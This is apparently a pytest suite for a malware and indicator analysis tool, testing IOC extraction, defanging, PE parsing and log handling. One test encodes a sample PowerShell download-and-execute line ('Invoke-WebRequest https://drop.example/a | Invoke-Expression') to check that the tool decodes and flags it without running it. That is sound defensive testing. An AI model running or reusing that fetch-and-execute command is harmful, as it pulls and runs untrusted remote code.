import base64
import hashlib
import json
import os
import struct
import pytest
from atlas.analyze import analyze, canonical, decode_text, entropy, extract, pe_metadata

@pytest.mark.parametrize("data,expected", [(b"", 0), (b"a" * 10000, 0), (bytes(range(256)) * 40, 8)])
def test_entropy(data, expected):
    assert entropy(data) == expected

@pytest.mark.parametrize("kind,value,expected", [
    ("ip", "999.1.1.1", None), ("ip", "192[.]0[.]2[.]1", "192.0.2.1"),
    ("url", "hxxps://Example.COM/path#fragment", "https://example.com/path"),
    ("url", "http://example.com:80", "http://example.com/"), ("url", "http://example.com:99999", None),
    ("cve", "cve-2024-3094", "CVE-2024-3094"), ("domain", "program.exe", None),
    ("email", "USER@Example.COM", "user@example.com"),
])
def test_normalization(kind, value, expected):
    assert canonical(kind, value) == expected

def test_extract_provenance_and_invalid_ip():
    text = "header\nhttps://test.example/path\nmail@demo.example\n192.0.2.1 999.2.3.4\nCVE-2024-3094\n" + "a" * 64
    result = analyze(text.encode(), "evidence.txt")
    by_kind = {k: [r for r in result["occurrences"] if r["kind"] == k] for k in ("url", "ip", "email", "domain", "sha256", "cve")}
    assert by_kind["url"][0]["line"] == 2
    assert by_kind["url"][0]["offset"] == 7
    assert by_kind["ip"][0]["value"] == "192.0.2.1"
    assert len(by_kind["ip"]) == 1
    assert "demo.example" in {r["value"] for r in by_kind["domain"]}
    assert by_kind["sha256"][0]["value"] == "a" * 64
    assert any(r["relation"] == "hosted_on" for r in result["relations"])

def test_utf16_and_binary_strings():
    text, encoding = decode_text("hello 192.0.2.1".encode("utf-16"))
    assert "192.0.2.1" in text and encoding == "utf-16"
    text, encoding = decode_text(b"\0\x01" + b"https://binary.example/path" + b"\0")
    assert "binary.example" in text and encoding == "binary-strings"

def test_timestamp_normalization_and_invalid_dates():
    text = "2026-10-06T11:00:00+03:00 login failed\n2026-10-06 08:00:00 connect\n2026-99-99T00:00:00 ignored"
    events = analyze(text.encode(), "events.log")["events"]
    assert len(events) == 2
    assert events[0]["timestamp"] == events[1]["timestamp"] == "2026-10-06T08:00:00.000+00:00"
    assert events[0]["kind"] == "auth"

def test_encoded_command_is_decoded_but_never_executed(tmp_path):
    marker = tmp_path / "must-not-exist"
    payload = f"touch {marker}\nInvoke-WebRequest https://drop.example/a | Invoke-Expression"
    encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
    result = analyze(f"powershell -EncodedCommand {encoded}".encode(), "script.ps1")
    assert result["children"][0]["data"].decode() == payload
    assert result["findings"][0]["rule"] == "SCRIPT-001"
    assert not marker.exists()

def test_malformed_pe_is_bounded():
    data = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0xffffffff)
    assert pe_metadata(data)["valid_pe"] is False
    result = analyze(data, "invoice.pdf")
    assert any(f["rule"] == "FILE-002" for f in result["findings"])

def test_pe_sections_and_rwx():
    data = bytearray(512)
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 60, 64)
    data[64:68] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", data, 68, 0x8664, 1, 1700000000, 0, 0, 0, 0)
    struct.pack_into("<8sIIIIIIHHI", data, 88, b".packed", 256, 0, 256, 256, 0, 0, 0, 0, 0xE0000000)
    data[256:] = bytes(range(256))
    result = analyze(bytes(data), "sample.exe")
    assert result["metadata"]["architecture"] == "x64"
    assert result["metadata"]["sections"][0]["entropy"] == 8
    assert any(f["rule"] == "FILE-003" for f in result["findings"])

def test_json_dns_edges_observed_only():
    text = json.dumps({"query": "dns.example", "answer": "203.0.113.8"})
    result = analyze(text.encode(), "dns.jsonl")
    assert result["relations"][0]["relation"] == "resolves_to"
    assert result["relations"][0]["line"] == 1

def test_hashes_match_original_bytes():
    raw = os.urandom(4096)
    result = analyze(raw, "binary.bin")
    assert result["metadata"]["sha256"] == hashlib.sha256(raw).hexdigest()

def test_pdf_text():
    from pypdf import PdfWriter
    from pypdf.generic import DecodedStreamObject, DictionaryObject, NameObject
    import io
    writer = PdfWriter()
    page = writer.add_blank_page(width=600, height=800)
    font = DictionaryObject({NameObject('/Type'): NameObject('/Font'), NameObject('/Subtype'): NameObject('/Type1'), NameObject('/BaseFont'): NameObject('/Helvetica')})
    page[NameObject('/Resources')] = DictionaryObject({NameObject('/Font'): DictionaryObject({NameObject('/F1'): writer._add_object(font)})})
    stream = DecodedStreamObject(); stream.set_data(b'BT /F1 12 Tf 10 700 Td (PDF indicator 192.0.2.5) Tj ET')
    page[NameObject('/Contents')] = writer._add_object(stream)
    target = io.BytesIO(); writer.write(target)
    result = analyze(target.getvalue(), 'report.pdf')
    assert result["metadata"]["pages"] == 1
    assert "192.0.2.5" in result["text"]

def test_occurrence_limit_and_late_line_extraction():
    text = "192.0.2.1\n" * 25000
    assert len(extract(text)) == 20000

def test_dns_mentions_not_double_counted():
    result = analyze(json.dumps({'query':'dns.example','answer':'192.0.2.1'}).encode(), 'dns.jsonl')
    assert len([o for o in result['occurrences'] if o['kind'] == 'domain']) == 1
    assert len([o for o in result['occurrences'] if o['kind'] == 'ip']) == 1

def test_csv_urls_stop_at_column_boundaries_and_preserve_quoted_commas():
    text = 'time,url,status\n2026-10-06T08:00:00Z,https://a.example/path,200\n2026-10-06T08:00:01Z,"https://b.example/path?a=one,two",200'
    urls = [o['value'] for o in analyze(text.encode(), 'proxy.csv')['occurrences'] if o['kind'] == 'url']
    assert urls == ['https://a.example/path', 'https://b.example/path?a=one,two']

def test_archive_container_does_not_index_compressed_garbage():
    import io,zipfile
    buffer=io.BytesIO()
    with zipfile.ZipFile(buffer,'w') as archive: archive.writestr('not-a-domain.txtpk', 'ignored')
    result=analyze(buffer.getvalue(),'archive.zip')
    assert result['occurrences'] == []
    assert result['metadata']['format'] == 'ZIP'
